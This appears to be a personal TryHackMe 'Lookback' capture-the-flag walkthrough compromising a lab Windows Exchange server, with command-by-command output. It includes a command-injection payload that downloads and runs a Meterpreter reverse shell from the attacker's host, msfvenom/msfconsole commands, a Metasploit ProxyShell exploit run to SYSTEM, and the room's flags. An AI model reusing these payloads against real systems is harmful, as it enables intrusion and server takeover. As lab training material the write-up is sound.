---
title: lookback
date: 2026-03-09
tags:
  - technology
  - tryhackme
  - boot-to-root
  - walkthrough
  - hacking
  - windows
---
# Description
> The Lookback company has just started the integration with Active Directory. Due to the coming deadline, the system integrator had to rush the deployment of the environment. Can you spot any vulnerabilities?

# Killchain
## 1. Discover ports with Nmap.
`#Reconnaissance`
- Port Scanning (T1595.002)
# 2. Bruteforce valid credentials on an Exchange web page
`#Initial Access`
- Password Spraying (T1110)
- Valid Accounts (T1078)
# 3. Enumerate for a hidden webpage
`#Reconnaissance`
- Web Service Scanning (T1595.003)
# 4. Use Command Injection to create a Meterpreter Reverse Shell
`#Weaponization #Exploitation #Installation`
- Exploitation for Client Execution (T1203)
- Command and Scripting Interpreter (T1059)
- Non-Application Layer Protocol (T1095)
- Ingress Tool Transfer (T1105)
# 5. Gain NT AUTHORITY\SYSTEM via an RCE exploit that bypasses authentication, impersonates an arbitrary user, and writes an arbitrary file in a vulnerable version of Exchange 2019.
`#Prvilege Escalation #Actions on Objectives`
- Exploitation for Privilege Escalation (T1068)
- Domain Accounts (T1078.002)
- Ingress Tool Transfer (T1105)
- Exploit Public-Facing Application (T1190)

---
# Lessons Learnt
- Always include the domain names in your /etc/hosts file for domain controllers.

---
# Nmap
`$sudo nmap -A 10.49.162.32 -oG nmap.txt -v`
- `WIN-12OUO7A66M7`
- `thm.local`
- `WIN-12OUO7A66M7.thm.local`
- 80/tcp: Microsoft IIS httpd 10.0
- 443/tcp: ssl/https
- 3389/tcp: ms-wbt-server Microsoft Terminal Services
- windows_server_2019

Add to etc hosts:
```
$cat /etc/hosts
...
10.49.151.254 thm.local WIN-12OUO7A66M7.thm.local
```

# Browser
Going to `https://win-12ouo7a66m7.thm.local` redirects to `https://win-12ouo7a66m7.thm.local/owa/auth/logon.aspx?replaceCurrent=1&url=https%3a%2f%2fwin-12ouo7a66m7.thm.local%2fowa%2f`:

![[Assets/Pasted image 20260309103018.png]]

Tinkering around, I see that an incorrect password/username gives:
>The user name or password you entered isn't correct. Try entering it again. 

But when I put ==admin : admin==:

![[Pasted image 20260309104426.png]]

# dirb
```
$dirb http://10.49.165.168 /usr/share/wordlists/dirb/big.txt -w
...
+ http://10.49.165.168/rpc (CODE:401|SIZE:0)
+ http://10.49.165.168/test (CODE:401|SIZE:0)
```

# Browser
Heading to the found sites and using admin:admin brings nothing for GET on rpc and a flag on test:
![[Pasted image 20260309115820.png]]

Typing in the path `BitlockerActiveMonitoringLogs; pwd` raises an error, and we can see the command being executed:
```
Get-Content : Cannot find path 'C:\BitlockerActiveMonitoringLogs; pwd' because it does not exist.
At line:1 char:1
+ Get-Content('C:\BitlockerActiveMonitoringLogs; pwd')
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (C:\BitlockerActiveMonitoringLogs; pwd:String) [Get-Content], ItemNotFou 
   ndException
    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetContentCommand
```

Using the escape characters `'); <COMMAND> #` we can execute code
```
BitlockerActiveMonitoringLogs'); pwd #:
List generated at 12:31:18 AM.

Path                       
----                       
C:\windows\system32\inetsrv
```

Now that we have code execution, I will setup a Meterpreter reverse shell.
# Python HTTP Server
```
$python -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
# MSFVenom + MSFConsole
```
$msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.149.188 LPORT=9001 -f exe -o reverse.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7680 bytes
Saved as: reverse.exe

$msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost 192.168.149.188; set lport 9001; exploit"
[*] Using configured payload generic/shell_reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
lhost => 192.168.149.188
lport => 9001
[*] Started reverse TCP handler on 192.168.149.188:9001
```

# Browser test page
Inputting the following command spawns a meterpreter reverse shell by serving the file by python and msfconsole listener: `BitlockerActiveMonitoringLogs'); Invoke-WebRequest -Uri 'http://192.168.149.188:8000/reverse.exe' -OutFile "$ENV:Temp\reverse.exe"; Start-Process "$ENV:Temp\reverse.exe" #`

# MSFConsole Meterpreter Session - THM\admin
Retrieve the user flag
```
(Meterpreter 1)(C:\windows\system32\inetsrv) > getuid
Server username: THM\admin

(Meterpreter 1)(C:\windows\system32\inetsrv) > sysinfo
Computer        : WIN-12OUO7A66M7
OS              : Windows Server 2019 (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : THM
Logged On Users : 11
Meterpreter     : x64/windows

(Meterpreter 1)(C:\windows\system32\inetsrv) > ls /Users
Listing: /Users
===============

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040777/rwxrwxrwx  8192  dir   2023-01-26 06:54:46 +1000  .NET v4.5
040777/rwxrwxrwx  8192  dir   2023-01-26 06:54:46 +1000  .NET v4.5 Classic
040777/rwxrwxrwx  8192  dir   2023-03-23 05:13:44 +1000  Administrator
040777/rwxrwxrwx  0     dir   2018-09-15 17:28:48 +1000  All Users
040555/r-xr-xr-x  0     dir   2023-01-26 14:06:57 +1000  Default
040777/rwxrwxrwx  0     dir   2018-09-15 17:28:48 +1000  Default User
040555/r-xr-xr-x  4096  dir   2023-01-26 14:15:14 +1000  Public
100666/rw-rw-rw-  174   fil   2018-09-15 17:16:48 +1000  desktop.ini
040777/rwxrwxrwx  8192  dir   2023-02-21 18:31:24 +1000  dev

(Meterpreter 1)(C:\windows\system32\inetsrv) > ls /Users/dev
Listing: /Users/dev
===================

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
040555/r-xr-xr-x  0       dir   2023-01-27 07:16:28 +1000  3D Objects
040777/rwxrwxrwx  0       dir   2023-01-27 07:16:26 +1000  AppData
040777/rwxrwxrwx  0       dir   2023-01-27 07:16:26 +1000  Application Data
040555/r-xr-xr-x  0       dir   2023-01-27 07:16:28 +1000  Contacts
040777/rwxrwxrwx  0       dir   2023-01-27 07:16:26 +1000  Cookies
040555/r-xr-xr-x  0       dir   2023-02-13 05:54:24 +1000  Desktop
040555/r-xr-xr-x  0       dir   2023-01-27 07:16:28 +1000  Documents
040555/r-xr-xr-x  0       dir   2023-01-27 07:16:28 +1000  Downloads
040555/r-xr-xr-x  0       dir   2023-01-27 07:16:28 +1000  Favorites
040555/r-xr-xr-x  0       dir   2023-01-27 07:16:28 +1000  Links
040777/rwxrwxrwx  0       dir   2023-01-27 07:16:26 +1000  Local Settings
040555/r-xr-xr-x  0       dir   2023-01-27 07:16:28 +1000  Music
040777/rwxrwxrwx  0       dir   2023-01-27 07:16:26 +1000  My Documents
100666/rw-rw-rw-  786432  fil   2026-03-09 10:40:19 +1000  NTUSER.DAT
100666/rw-rw-rw-  65536   fil   2023-01-27 07:16:26 +1000  NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TM.blf
100666/rw-rw-rw-  524288  fil   2023-01-27 07:16:26 +1000  NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TMContainer00000000000000000001.regtrans-ms
100666/rw-rw-rw-  524288  fil   2023-01-27 07:16:26 +1000  NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TMContainer00000000000000000002.regtrans-ms
040777/rwxrwxrwx  0       dir   2023-01-27 07:16:26 +1000  NetHood
040555/r-xr-xr-x  0       dir   2023-01-27 07:16:28 +1000  Pictures
040777/rwxrwxrwx  0       dir   2023-01-27 07:16:26 +1000  PrintHood
040777/rwxrwxrwx  0       dir   2023-01-27 07:16:26 +1000  Recent
040555/r-xr-xr-x  0       dir   2023-01-27 07:16:28 +1000  Saved Games
040555/r-xr-xr-x  0       dir   2023-01-27 07:16:28 +1000  Searches
040777/rwxrwxrwx  0       dir   2023-01-27 07:16:26 +1000  SendTo
040777/rwxrwxrwx  0       dir   2023-01-27 07:16:26 +1000  Start Menu
040777/rwxrwxrwx  0       dir   2023-01-27 07:16:26 +1000  Templates
040555/r-xr-xr-x  0       dir   2023-01-27 07:16:28 +1000  Videos
100666/rw-rw-rw-  0       fil   2023-01-27 07:16:26 +1000  ntuser.dat.LOG1
100666/rw-rw-rw-  0       fil   2023-01-27 07:16:26 +1000  ntuser.dat.LOG2
100666/rw-rw-rw-  20      fil   2023-01-27 07:16:26 +1000  ntuser.ini

(Meterpreter 1)(C:\windows\system32\inetsrv) > ls /Users/dev/Desktop
Listing: /Users/dev/Desktop
===========================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  512   fil   2023-03-22 05:28:06 +1000  TODO.txt
100666/rw-rw-rw-  282   fil   2023-01-27 07:16:28 +1000  desktop.ini
100666/rw-rw-rw-  29    fil   2023-02-13 05:53:21 +1000  user.txt

(Meterpreter 1)(C:\windows\system32\inetsrv) > cat /Users/dev/Desktop/user.txt
THM{Stop_Reading_Start_Doing}
```

# Shell
```
C:\windows\system32\inetsrv>net users
net users

User accounts for \\WIN-12OUO7A66M7

-------------------------------------------------------------------------------
$231000-O0QPBLAP47AA     Administrator            dev                      
Guest                    HealthMailbox079218d     HealthMailbox07b8995     
HealthMailbox451693b     HealthMailbox5d7068d     HealthMailbox661f7fa     
HealthMailbox7592f90     HealthMailbox82636a0     HealthMailbox878368d     
HealthMailbox8e51e05     HealthMailboxb417c9a     HealthMailboxd070f22     
krbtgt                   SM_01c36984a0954584b     SM_0bcc8f43b5d449549     
SM_77808a1914dd4685a     SM_8732593a4dab45bab     SM_9d95c1b345b24820a     
SM_ccc03880b6df44e2b     SM_de8cf2884b5344449     SM_fe3ac6e6c5c048879     
SM_fff1c36ebaee496d9     
The command completed successfully.


C:\windows\system32\inetsrv>net localgroup
net localgroup

Aliases for \\WIN-12OUO7A66M7

-------------------------------------------------------------------------------
*Access Control Assistance Operators
*Account Operators
*Administrators
*Allowed RODC Password Replication Group
*Backup Operators
*Cert Publishers
*Certificate Service DCOM Access
*Cryptographic Operators
*Denied RODC Password Replication Group
*Distributed COM Users
*DnsAdmins
*Event Log Readers
*Guests
*Hyper-V Administrators
*IIS_IUSRS
*Incoming Forest Trust Builders
*Network Configuration Operators
*Performance Log Users
*Performance Monitor Users
*Pre-Windows 2000 Compatible Access
*Print Operators
*RAS and IAS Servers
*RDS Endpoint Servers
*RDS Management Servers
*RDS Remote Access Servers
*Remote Desktop Users
*Remote Management Users
*Replicator
*Server Operators
*Storage Replica Administrators
*Terminal Server License Servers
*Users
*Windows Authorization Access Group
The command completed successfully.

C:\windows\system32\inetsrv>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                        State  
============================= ================================== =======
SeAssignPrimaryTokenPrivilege Replace a process level token      Enabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process Enabled
SeMachineAccountPrivilege     Add workstations to domain         Enabled
SeAuditPrivilege              Generate security audits           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking           Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set     Enabled
```

# JuicyPotato
Researching these privileges, I see that [JuicyPotato](https://github.com/ohpe/juicy-potato) can be used to exploit `SeAssignPrimaryTokenPrivilege` on Windows Server 2019. While researching, my attacking vm crashed, but nothing on my end changed thankfully.
Using JuicyPotato did not work however, and Named Pipe Impersonations from MSF failed too.

# MSF Meterpreter Session - THM\admin
Looking back on the dev desktop, I missed content:
```
(Meterpreter 1)(C:\windows\system32\inetsrv) > cat /Users/dev/Desktop/TODO.txt
Hey dev team,

This is the tasks list for the deadline:

Promote Server to Domain Controller [DONE]
Setup Microsoft Exchange [DONE]
Setup IIS [DONE]
Remove the log analyzer[TO BE DONE]
Add all the users from the infra department [TO BE DONE]
Install the Security Update for MS Exchange [TO BE DONE]
Setup LAPS [TO BE DONE]


When you are done with the tasks please send an email to:

joe@thm.local
carol@thm.local
and do not forget to put in CC the infra team!
dev-infrastracture-team@thm.local
```

# Burp Suite
Looking at the /test directory request in burp suite, the user+password is a base64 authorization token with user:password. In intruder we can process this and a custom iterator with the names joe, carol, dev, and dev-infrastructure-team. This led nowhere.
# Shell
Next I tried searching for vulnerable software, and came across the exchange server version (also stated in the TODO note):
```
PS C:\windows\system32\inetsrv> (Get-Item "C:\Program Files\Microsoft\Exchange Server\V15\Bin\Microsoft.Exchange.ServiceHost.exe").VersionInfo
(Get-Item "C:\Program Files\Microsoft\Exchange Server\V15\Bin\Microsoft.Exchange.ServiceHost.exe").VersionInfo

ProductVersion   FileVersion      FileName                                                                             
--------------   -----------      --------                                                                             
15.02.0858.002   15.02.0858.002   C:\Program Files\Microsoft\Exchange Server\V15\Bin\Microsoft.Exchange.ServiceHost.exe
```

# MSFConsole
Searching for exploits:
```
search exchange 15

Matching Modules
================

   #   Name                                            Disclosure Date  Rank       Check  Description
   -   ----                                            ---------------  ----       -----  -----------
   0   exploit/linux/persistence/apt_package_manager   1999-03-09       excellent  Yes    APT Package Manager Persistence
   1   auxiliary/scanner/ike/cisco_ike_benigncertain   2016-09-29       normal     No     Cisco IKE Information Disclosure
   2   auxiliary/gather/exchange_proxylogon_collector  2021-03-02       normal     No     Microsoft Exchange ProxyLogon Collector
   3     \_ action: Dump (Contacts)                    .                .          .      Dump user contacts from exchange server
   4     \_ action: Dump (Emails)                      .                .          .      Dump user emails from exchange server
   5   exploit/windows/http/exchange_proxylogon_rce    2021-03-02       excellent  Yes    Microsoft Exchange ProxyLogon RCE
   6     \_ target: Windows Powershell                 .                .          .      .
   7     \_ target: Windows Dropper                    .                .          .      .
   8     \_ target: Windows Command                    .                .          .      .
   9   auxiliary/scanner/http/exchange_proxylogon      2021-03-02       normal     No     Microsoft Exchange ProxyLogon Scanner
   10  exploit/windows/http/exchange_proxyshell_rce    2021-04-06       excellent  Yes    Microsoft Exchange ProxyShell RCE
   11    \_ target: Windows Powershell                 .                .          .      .
   12    \_ target: Windows Dropper                    .                .          .      .
   13    \_ target: Windows Command                    .                .          .      .


Interact with a module by name or index. For example info 13, use 13 or use exploit/windows/http/exchange_proxyshell_rce
After interacting with a module you can manually set a TARGET with set TARGET 'Windows Command'
```

I tried with `exchange_proxylogon_rce`, but no luck. I tried with `exchange_proxyshell_rce`:
```
[msf](Jobs:0 Agents:1) exploit(windows/http/exchange_proxyshell_rce) >> setg RHOSTS 10.49.165.168
RHOSTS => 10.49.165.168
[msf](Jobs:0 Agents:1) exploit(windows/http/exchange_proxyshell_rce) >> setg LHOST 192.168.149.188
LHOST => 192.168.149.188
[msf](Jobs:0 Agents:1) exploit(windows/http/exchange_proxyshell_rce) >> setg LPORT 9001
LPORT => 9001
[msf](Jobs:0 Agents:1) exploit(windows/http/exchange_proxyshell_rce) >> set EMAIL dev-infrastracture-team@thm.local
EMAIL => dev-infrastracture-team@thm.local
[msf](Jobs:0 Agents:1) exploit(windows/http/exchange_proxyshell_rce) >> explot
[-] Unknown command: explot. Did you mean exploit? Run the help command for more details.
[msf](Jobs:0 Agents:1) exploit(windows/http/exchange_proxyshell_rce) >> exploit
[*] Started reverse TCP handler on 192.168.149.188:9001 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable.
[*] Attempt to exploit for CVE-2021-34473
[*] Retrieving backend FQDN over RPC request
[*] Internal server name: win-12ouo7a66m7.thm.local
[*] Assigning the 'Mailbox Import Export' role via dev-infrastracture-team@thm.local
[+] Successfully assigned the 'Mailbox Import Export' role
[+] Proceeding with SID: S-1-5-21-2402911436-1669601961-3356949615-1144 (dev-infrastracture-team@thm.local)
[*] Saving a draft email with subject '7u4w0cHq' containing the attachment with the embedded webshell
[*] Writing to: C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\IUkPuSVwjU.aspx
[*] Waiting for the export request to complete...
[+] The mailbox export request has completed
[*] Triggering the payload
[*] Sending stage (232006 bytes) to 10.49.165.168
[+] Deleted C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\IUkPuSVwjU.aspx
[*] Meterpreter session 2 opened (192.168.149.188:9001 -> 10.49.165.168:16557) at 2026-03-09 12:57:38 +1000
[*] Removing the mailbox export request
[*] Removing the draft email

(Meterpreter 2)(c:\windows\system32\inetsrv) > getuid
Server username: NT AUTHORITY\SYSTEM
```
We are now ==SYSTEM==

# MSF Meterpreter Session - NT AUTHORITY\SYSTEM
```
(Meterpreter 2)(c:\windows\system32\inetsrv) > ls /Users/Administrator/Documents
Listing: /Users/Administrator/Documents
=======================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  2232  fil   2023-01-27 07:16:32 +1000  Default.rdp
040777/rwxrwxrwx  0     dir   2023-01-26 14:15:09 +1000  My Music
040777/rwxrwxrwx  0     dir   2023-01-26 14:15:09 +1000  My Pictures
040777/rwxrwxrwx  0     dir   2023-01-26 14:15:09 +1000  My Videos
100666/rw-rw-rw-  402   fil   2023-01-26 14:15:14 +1000  desktop.ini
100666/rw-rw-rw-  35    fil   2023-02-13 05:57:18 +1000  flag.txt

(Meterpreter 2)(c:\windows\system32\inetsrv) > cat /Users/Administrator/Documents/flag.txt
THM{Looking_Back_Is_Not_Always_Bad}
```



